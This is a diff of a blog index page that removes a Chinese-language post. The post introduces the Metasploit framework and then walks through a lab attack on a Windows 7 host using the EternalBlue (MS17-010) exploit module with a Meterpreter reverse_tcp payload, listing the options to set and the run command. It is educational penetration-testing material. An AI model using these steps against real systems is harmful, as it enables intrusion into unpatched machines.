@@ -152,39 +152,6 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2021/05/18/%E6%B5%85%E8%B0%88msf/">
-                Untitled
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-18</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p> @<a href="Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">TOC</a></p>
-<h2 id="Metasploit渗透测试框架介绍"><a href="#Metasploit渗透测试框架介绍" class="headerlink" title="Metasploit渗透测试框架介绍"></a>Metasploit渗透测试框架介绍</h2><p><img src="https://img-blog.csdnimg.cn/20210410103503577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="1、简介：Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。
-2、Metasploit体系框架"><br>&lt;1&gt;基础库：Metasploit基础库文件位于源码目录路径下的libraries目录中，包括Rex，framework和framework-base三部分。<br> Rex是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、postgreSQL以及MYSQL数据库支持等；<br> &lt;2&gt;模块：模块组织按照不同的用途分为6种类型的模块<br> 分为辅助模块（Aux）、渗透攻击模块（Exploits）、后渗透攻击模块（Post）、攻击载荷模块（payloads）、编码器模块（Encoders）、空指令模块（Nops）。<br> 注：payload又称攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。<strong>可以理解为后门</strong><br> &lt;3&gt;插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等<br> &lt;4&gt;接口:包括msfconsole控制终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口。e<br> &lt;5&gt;功能程序: metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。</p>
-<h2 id="Metasploit目录"><a href="#Metasploit目录" class="headerlink" title="Metasploit目录"></a>Metasploit目录</h2><p><img src="https://img-blog.csdnimg.cn/2021041011024921.png" alt="在这里插入图片描述">data是Metasploit使用的可编辑文件<br>modules是模块<br>lib是框架<br>plugins是插件<br>scripts是Metasploit和其他脚本</p>
-<h2 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h2><p>攻击机：kali2020<br>被攻击机：windows7（445端口开启、windowsdefener关闭）<br>第一步：打开msf<br><img src="https://img-blog.csdnimg.cn/2021042416135198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步：永恒之蓝漏洞编号为ms17-010</p>
-<p><img src="https://img-blog.csdnimg.cn/20210424161947609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第三步：利用辅助模块扫描目标<br>use 1<br><img src="https://img-blog.csdnimg.cn/2021042416223116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置：options<br>yes为必须设置<br>设置目标地址：set rhosts +IP地址<br>设置目标端口：set rpost +445<br>攻击：run<br>第四步：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210424163908565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置options<br>设置目标地址：set RHOSTS windows7ip<br>设置目标端口：set RPORT 445<br>设置payload：set payload windows/x64/meterpreter/reverse_tcp<br>设置本地地址：set LHOST 本地IP<br>攻击：run</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
             <a href="/2021/05/18/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/">
                 Untitled
             </a>
